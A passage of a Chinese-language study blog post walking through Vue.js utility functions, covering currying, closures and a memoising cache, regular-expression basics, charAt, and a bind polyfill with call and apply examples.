对object对象类型转换达到的效果</span></span><br></pre></td></tr></table></figure><h2 id="研究对象-4"><a href="#研究对象-4" class="headerlink" title="研究对象"></a>研究对象</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeMap</span>(<span class="params">str, expectsLowerCase</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> map = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line">  <span class="keyword">var</span> list = str.split(<span class="string">","</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; list.length; i++) &#123;</span><br><span class="line">    map[list[i]] = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> expectsLowerCase</span><br><span class="line">    ? <span class="function"><span class="keyword">function</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 若expectsLowerCase存在且为true</span></span><br><span class="line">        <span class="keyword">return</span> map[val.toLowerCase()]; <span class="comment">// 则将键转为小写再返回map</span></span><br><span class="line">      &#125;</span><br><span class="line">    : <span class="function"><span class="keyword">function</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 若expectsLowerCase不存在或者为false</span></span><br><span class="line">        <span class="keyword">return</span> map[val]; <span class="comment">// 则直接返回map</span></span><br><span class="line">      &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="柯里化函数"><a href="#柯里化函数" class="headerlink" title="柯里化函数"></a>柯里化函数</h2><p>在计算机科学中，柯里化（Currying）是把接受多个参数的函数变换成接受一个单一参数(最初函数的第一个参数)的函数，并且返回接受余下的参数且返回结果的新函数的技术。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ---普通版--</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">typeTest</span>(<span class="params">dataType, obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">RegExp</span>(dataType, <span class="string">"gi"</span>).test(<span class="built_in">Object</span>.prototype.toString.call(obj));</span><br><span class="line">&#125;</span><br><span class="line">typeTest(<span class="string">"array"</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]); <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line">typeTest(<span class="string">"array"</span>, <span class="string">"Hello"</span>); <span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">typeTest(<span class="string">"boolean"</span>, <span class="literal">true</span>); <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ---Currying柯里化---</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">typeTest</span>(<span class="params">dataType, obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">RegExp</span>(dataType, <span class="string">"gi"</span>).test(<span class="built_in">Object</span>.prototype.toString.call(obj));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//--第一种--</span></span><br><span class="line"><span class="keyword">var</span> isNum = (<span class="function"><span class="keyword">function</span>(<span class="params">type</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> typeTest(type, data);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)(<span class="string">"number"</span>); <span class="comment">// 'number'传递到type，函数实际接收的参数传递到data</span></span><br><span class="line"></span><br><span class="line">isNum(<span class="number">1</span>); <span class="comment">//true</span></span><br><span class="line">isNum([]); <span class="comment">//false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//--第二种--</span></span><br><span class="line"><span class="keyword">var</span> isArr = typeTest.bind(<span class="literal">null</span>, <span class="string">"array"</span>); <span class="comment">// typeTest('array',null) null.typeTest('array')</span></span><br><span class="line"></span><br><span class="line">isArr(<span class="number">1</span>); <span class="comment">//false</span></span><br><span class="line">isArr([]); <span class="comment">//true</span></span><br></pre></td></tr></table></figure><h2 id="研究对象-5"><a href="#研究对象-5" class="headerlink" title="研究对象"></a>研究对象</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 函数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param </span>fn 接收待缓存的函数</span></span><br><span class="line"><span class="comment"> * 此处主要应用了闭包的思想，</span></span><br><span class="line"><span class="comment"> * 例如：</span></span><br><span class="line"><span class="comment"> * var strFn = cached(function(str) &#123; return str &#125;)</span></span><br><span class="line"><span class="comment"> * var a = strFn('ashen') 结果为'ashen'，此时strFn会存起cachedFn，由于闭包作用，cache也会被缓存起来，此时,由于hit为undefined,因此cache['ashen'] = 'ashen'</span></span><br><span class="line"><span class="comment"> * var b = strFn('ashen') 此时strFn也会存起cachedFn，由于cache已经被缓存起来，因此，第二次调用的是第一次a缓存的strFn函数。var hit = cache[str]会等于'ashen'</span></span><br><span class="line"><span class="comment"> * var c = strFn('test') 此时第三次调用，调用的strFn还是上次缓存的cachedFn，因为cache['test']为undefined，因此再次cache['test'] = 'test'，外层的return cachedFn会被strFn缓存起来，其中的cache['test'] = 'test'也会被缓存起来，用于下次</span></span><br><span class="line"><span class="comment"> * 由于缓存的原因，var cache = Object.create(null); 只执行一次</span></span><br><span class="line"><span class="comment"> * 每次调用，上次的cache都被缓存起来</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cached</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> cache = <span class="built_in">Object</span>.create(<span class="literal">null</span>); <span class="comment">// 创建空对象</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">cachedFn</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 函数，接收fn中的str参数，闭包</span></span><br><span class="line">    <span class="keyword">var</span> hit = cache[str]; <span class="comment">// 将fn中的str参数....?</span></span><br><span class="line">    <span class="keyword">return</span> hit || (cache[str] = fn(str)); <span class="comment">// 若hit没有str属性和值，则赋予fn的返回数据作为值</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><p>例子 1</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * myFunc 是执行 makeFunc 时创建的 displayName 函数实例的引用，</span></span><br><span class="line"><span class="comment"> * 而 displayName 实例仍可访问其词法作用域中的变量，即可以访问到 name 。</span></span><br><span class="line"><span class="comment"> * 由此，当 myFunc 被调用时，name 仍可被访问，其值 Mozilla 就被传递到alert中。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeFunc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> name = <span class="string">"Mozilla"</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">displayName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(name);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> displayName;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> myFunc = makeFunc();</span><br><span class="line">myFunc(); <span class="comment">// 可以访问闭包的name</span></span><br></pre></td></tr></table></figure><p>例子 2</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeAdder</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">y</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> add5 = makeAdder(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">var</span> add10 = makeAdder(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(add5(<span class="number">2</span>)); <span class="comment">// 7</span></span><br><span class="line"><span class="built_in">console</span>.log(add10(<span class="number">2</span>)); <span class="comment">// 12</span></span><br></pre></td></tr></table></figure><p>例子 3，<a href="./html/cached.html">对本次研究对象进行实例分析</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cached</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> cache = <span class="built_in">Object</span>.create(<span class="literal">null</span>); <span class="comment">// 创建空对象</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">cachedFn</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 函数，接收fn中的str参数</span></span><br><span class="line">    <span class="keyword">debugger</span>;</span><br><span class="line">    <span class="keyword">let</span> hit = cache[str]; <span class="comment">// 将fn中的str参数....?</span></span><br><span class="line">    <span class="keyword">debugger</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hit || (cache[str] = fn(str)); <span class="comment">// 若hit没有str属性和值，则赋予fn的返回数据作为值</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> capitalize = cached(<span class="function"><span class="keyword">function</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">debugger</span>;</span><br><span class="line">  <span class="keyword">return</span> str.charAt(<span class="number">0</span>).toUpperCase() + str.slice(<span class="number">1</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = capitalize(<span class="string">"ahen"</span>); <span class="comment">// 调用了capitalize，capitalize实际存储起来的是cachedFn，因此，下次此时var capitalize = function cachedFn(str) &#123;let hit = cache[str]; return hit || (cache[str] = fn(str)); &#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = capitalize(<span class="string">"ahen"</span>); <span class="comment">// 由于上述capitalize实际是已经缓存起来了cachedFn，而且由于闭包的原因，cache实际上自从第一次被创建后，每次调用都会被str覆盖，除非上次的结果等于本次的属性。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c = capitalize(<span class="string">"ahen1"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> d = capitalize(<span class="string">"ahen2"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> e = capitalize(<span class="string">"ahen"</span>);</span><br></pre></td></tr></table></figure><h2 id="研究对象-6"><a href="#研究对象-6" class="headerlink" title="研究对象"></a>研究对象</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> camelizeRE = <span class="regexp">/-(\w)/g</span>;</span><br></pre></td></tr></table></figure><h3 id="正则表达式（待完善）"><a href="#正则表达式（待完善）" class="headerlink" title="正则表达式（待完善）"></a>正则表达式（待完善）</h3><p><a href="https://www.jianshu.com/p/488d60349325" rel="external nofollow noopener noreferrer" target="_blank">参考学习</a><br><a href="https://www.w3school.com.cn/js/js_regexp.asp" rel="external nofollow noopener noreferrer" target="_blank">参考文档</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">"test123ABC"</span>;</span><br><span class="line"><span class="comment">// 1. 构造函数式声明</span></span><br><span class="line"><span class="keyword">let</span> patt1 = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"\\d"</span>, <span class="string">"g"</span>); <span class="comment">// 需要使用\\d来表示 \d，若只使用\d或者d则会解析成/d/g，则表示只匹配字母d</span></span><br><span class="line">patt1.test(str); <span class="comment">// let patt1 = /\d/ 返回true，因为str含有123</span></span><br><span class="line">patt1.exec(str); <span class="comment">// 返回["1", index: 4, input: "test123ABC", groups: undefined]</span></span><br><span class="line">patt1.exec(str); <span class="comment">// 返回["2", index: 5, input: "test123ABC", groups: undefined]</span></span><br><span class="line">patt1.exec(str); <span class="comment">// 返回["3", index: 6, input: "test123ABC", groups: undefined]</span></span><br><span class="line">patt1.exec(str); <span class="comment">// 返回null</span></span><br></pre></td></tr></table></figure><p>exec 例子：</p><p><img src="/images/2019-12-18-20-26-47.png" alt="exec例子"></p><p>exec 解释：<a href="https://www.w3school.com.cn/jsref/jsref_exec_regexp.asp" rel="external nofollow noopener noreferrer" target="_blank">参考文档</a></p><p><img src="/images/2019-12-18-20-27-59.png" alt></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">"test123ABC"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 字面量式声明</span></span><br><span class="line"><span class="keyword">let</span> patt1 = <span class="regexp">/\d/g</span>; <span class="comment">// 通过//符号作为开始结束，\d为元字符，表示匹配数字,g表示全局匹配</span></span><br><span class="line"></span><br><span class="line">str.match(patt1); <span class="comment">// 得到["1","2","3"]，若没有g，则得到["1", index: 4, input: "test123ABC", groups: undefined]，其中"1"表示匹配到的第一个数字，index则表示位置</span></span><br><span class="line">str.replace(patt1, <span class="string">"WK"</span>); <span class="comment">// 得到testWKWKWKABC，若没有g，则得到testWK23ABC</span></span><br><span class="line"><span class="comment">// 若为'v-for'.replace(patt1,function(a,b)&#123; return b &#125;)，其中a接收的是'-for',b接收的是'for',因为是replace，所以-for被替换，return b，则-for被替换为for，因此结果我vfor</span></span><br></pre></td></tr></table></figure><h4 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h4><ul><li>i 执行对大小写不敏感</li><li>g 执行全局匹配</li><li>m 执行多行匹配</li></ul><h4 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h4><blockquote><p><code>[]</code> 匹配方括号内的任意字符，<code>()</code>类似将一个表达式闭包闭合起来</p></blockquote><ul><li><code>[abc]</code> 匹配反括号之间的任何字符 例如：<code>&#39;ashen114&#39;.match(/[abcde]/g)</code>，得到<code>[&quot;a&quot;,&quot;e&quot;]</code>，</li><li><code>[^abc]</code> 匹配不在方括号内的任意字符 例如：<code>&#39;ashen114&#39;.match(/[^abcde]/g)</code>，得到<code>[&quot;s&quot;,&quot;h&quot;,&quot;n&quot;]</code>，</li><li><code>[0-9]</code> 匹配反括号之间的任何字符 例如：<code>&#39;ashen114&#39;.match(/[0-9]/g)</code>，得到<code>[&quot;1&quot;,&quot;1&quot;,&quot;4&quot;]</code>，</li><li><code>[a-z]</code> 匹配任何从小写 a-z 的字符 例如：<code>&#39;ashen114&#39;.match(/[a-z]/g)</code>，得到<code>[&quot;a&quot;,&quot;s&quot;,&quot;h&quot;,&quot;e&quot;,&quot;n&quot;]</code>，</li><li><code>[A-Z]</code> 匹配任何从大写 A-Z 的字符 例如：<code>&#39;CodingFun&#39;.match(/[a-z]/g)</code>，得到<code>[&quot;C&quot;,&quot;F&quot;]</code>，</li><li><code>(x|y)</code> 查询由<code>|</code>分割的任何选项 例如：<code>&#39;red,yellow,red,green&#39;.match(/(red|green)/g)</code>，得到<code>[&quot;red&quot;, &quot;red&quot;, &quot;green&quot;]</code></li><li><code>\w</code> 查找单词字符，单词字符包括：a-z、A-Z、0-9，以及下划线, 包含 _ (下划线) 字符。 例如:<code>&#39;a@b#1$2%&#39;.match(/\w/g)</code>，得到<code>[&quot;a&quot;, &quot;b&quot;, &quot;1&quot;, &quot;2&quot;]</code></li></ul><h4 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h4><ul><li><code>\d</code> 查找数字 例如：<code>&#39;ashen114&#39;.match(/\d/g)</code>，得到  <code>[&quot;1&quot;, &quot;1&quot;, &quot;4&quot;]</code></li><li><code>\s</code> 查找空白字符 例如：<code>&#39;a is a&#39;</code>，得到<code>[&quot;&quot;,&quot;&quot;]</code>表示存在两个空白字符</li><li><code>\b</code> 匹配单词边界，查找对象是否处于边界，空白字符串，及非\w 的都可以作为边界 例如：<code>&#39;js sj@js jsj&#39;.match(/\bjs/g)</code>，得到<code>[&quot;js&quot;,&quot;js&quot;,&quot;js&quot;]</code>,其中第一个 js 为开头的 js，第二个是因为特殊符号@不包括\w 中，因为被列为边界，第三个 js 则是结尾的 jsj 的开头部分 js</li><li><code>\B</code> 与<code>\b</code>相反 例如<code>&#39;js sj@js jsj&#39;.match(/\bj/g)</code>，得到<code>[&quot;j&quot;, &quot;j&quot;]</code>,其中第一个 j 是 sj@的 j，第二个 j 则是结尾的 j，因为他们不处于边界，而开头的 js，@js 何结尾的 jsj 的首字母都处于边界。</li><li><code>\uxxxxx</code> 匹配 16 进制字符串 例如：<code>&#39;Welcome! Hello World&#39;.match(/\u0057/g)</code>，得到<code>[&quot;W&quot;,&quot;W&quot;]</code>,因为十六进制 0057 是 W</li></ul><h4 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h4><ul><li><code>n+</code> 匹配任何包含至少一个 n 的字符串 例如：<code>&#39;i am aaa,hahaah&#39;.match(/a+/g)</code>,得到<code>[&quot;a&quot;,&quot;aaaa&quot;,&quot;a&quot;,&quot;aa&quot;]</code>，若是<code>/aa+/g</code>，则得到<code>[&quot;aaa&quot;,&quot;aa&quot;]</code></li><li><code>n*</code> 匹配任何包含零个或者多个 n 的字符串 例如：<code>&#39;i am aaa,hahaah&#39;.match(/ha*/g)</code>,得到<code>[&quot;ha&quot;, &quot;haa&quot;, &quot;h&quot;]</code>，若是<code>/h*/g</code>，则得到<code>[&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;h&quot;, &quot;&quot;, &quot;h&quot;, &quot;&quot;, &quot;&quot;, &quot;h&quot;, &quot;&quot;]</code></li><li><code>n?</code> 匹配任何包含零个或者一个 n 的字符串 例如：<code>&#39;i am aaa,hahaah&#39;.match(/ha?/g)</code>,得到<code>[&quot;ha&quot;, &quot;ha&quot;, &quot;h&quot;]</code>，若是<code>/h?/g</code>，则得到<code>[&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;h&quot;, &quot;&quot;, &quot;h&quot;, &quot;&quot;, &quot;&quot;, &quot;h&quot;, &quot;&quot;]</code></li></ul><h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h4><blockquote><p>过滤 p 标签</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">'&lt;p class="test" style="height:60px;"&gt;&lt;/p&gt;'</span>;</span><br><span class="line">str.replace(<span class="regexp">/&lt;p[^&gt;]*? style\s?=\s?["']?([^"']*)["']?[^&gt;]*?&gt;/g</span>, <span class="string">"&lt;p&gt;"</span>); <span class="comment">// "&lt;p&gt;&lt;/p&gt;"</span></span><br></pre></td></tr></table></figure><blockquote><p>过滤 p 标签的 style</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">'&lt;p class="test" style="height:60px;"&gt;&lt;/p&gt;'</span>;</span><br><span class="line"><span class="keyword">let</span> reg = <span class="regexp">/&lt;p(\s([a-zA-Z0-9-]*)=\"([^=\"]*)\")*&gt;/gim</span>;</span><br><span class="line">str.replace(reg, <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (s = s.replace(<span class="regexp">/\sstyle=\"[^\"]*\"/</span>, <span class="string">""</span>));</span><br><span class="line">&#125;); <span class="comment">// "&lt;p class="test"&gt;&lt;/p&gt;"</span></span><br></pre></td></tr></table></figure><h2 id="研究对象-7"><a href="#研究对象-7" class="headerlink" title="研究对象"></a>研究对象</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> capitalize = cached(<span class="function"><span class="keyword">function</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.charAt(<span class="number">0</span>).toUpperCase() + str.slice(<span class="number">1</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="charAt"><a href="#charAt" class="headerlink" title="charAt"></a>charAt</h3><blockquote><p><code>str.charAt(index)</code> 可以根据 index 索引值找到当前字符串的值</p></blockquote><p>例如：<code>&#39;ashen&#39;.charAt(2)</code>得到<code>h</code></p><h2 id="研究对象-8"><a href="#研究对象-8" class="headerlink" title="研究对象"></a>研究对象</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** 正则表达式：匹配全部处于非边界的大写A-Z的字母，例如：_TEST.match(hyphenateRE)，则 得到TEST*/</span></span><br><span class="line"><span class="keyword">var</span> hyphenateRE = <span class="regexp">/\B([A-Z])/g</span>;</span><br><span class="line"><span class="keyword">var</span> hyphenate = cached(<span class="function"><span class="keyword">function</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 将匹配项转为"-小写"，其中$1表示每个匹配的字母，将每个匹配的转为-字母，再转为小写</span></span><br><span class="line">  <span class="keyword">return</span> str.replace(hyphenateRE, <span class="string">"-$1"</span>).toLowerCase();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>str.replace(hyphenateRE, &quot;-$1&quot;).toLowerCase();</code></p><p>其中<code>$1</code>为每个匹配项</p><h2 id="研究对象-9"><a href="#研究对象-9" class="headerlink" title="研究对象"></a>研究对象</h2><p><a href="https://www.jianshu.com/p/625c35d84a80" rel="external nofollow noopener noreferrer" target="_blank">参考文档</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">polyfillBind</span>(<span class="params">fn, ctx</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">boundFn</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> l = <span class="built_in">arguments</span>.length;</span><br><span class="line">    <span class="keyword">return</span> l</span><br><span class="line">      ? l &gt; <span class="number">1</span></span><br><span class="line">        ? fn.apply(ctx, <span class="built_in">arguments</span>)</span><br><span class="line">        : fn.call(ctx, a)</span><br><span class="line">      : fn.call(ctx);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  boundFn._length = fn.length;</span><br><span class="line">  <span class="keyword">return</span> boundFn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="apply-amp-amp-call"><a href="#apply-amp-amp-call" class="headerlink" title="apply &amp;&amp; call"></a>apply &amp;&amp; call</h3><p>学习链接：<a href="https://www.runoob.com/w3cnote/js-call-apply-bind.html" rel="external nofollow noopener noreferrer" target="_blank">https://www.runoob.com/w3cnote/js-call-apply-bind.html</a></p><p>apply</p><blockquote><p>调用一个对象的方法，用另一个对象替换当前对象，可以继承另外一个对象的属性，它的语法是：<br><code>Function.apply(obj[, argArray]);</code></p></blockquote><p>call</p><blockquote><p>调用一个对象的方法，用另一个对象替换当前对象，可以继承另外一个对象的属性，它的语法是：<br><code>Function.call(obj[, param1[, param2[, [,...paramN]]]]);</code></p></blockquote><p>apply 与 call 类似，只是传参有点差异</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a + b + c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(add.call(sub, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)); <span class="comment">// 6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 因为call()方法改变了this的指向，使得sub可以调用add的方法，也就是用sub去执行add中的内容</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">People</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Student</span>(<span class="params">name, age, grade</span>) </span>&#123;</span><br><span class="line">  People.call(<span class="keyword">this</span>, name, age);</span><br><span class="line">  <span class="keyword">this</span>.grade = grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> student = <span class="keyword">new</span> Student(<span class="string">"小明"</span>, <span class="number">21</span>, <span class="string">"大三"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(student.name + student.age + student.grade); <span class="comment">//小明21大三</span></span><br><span class="line"></span><br><span 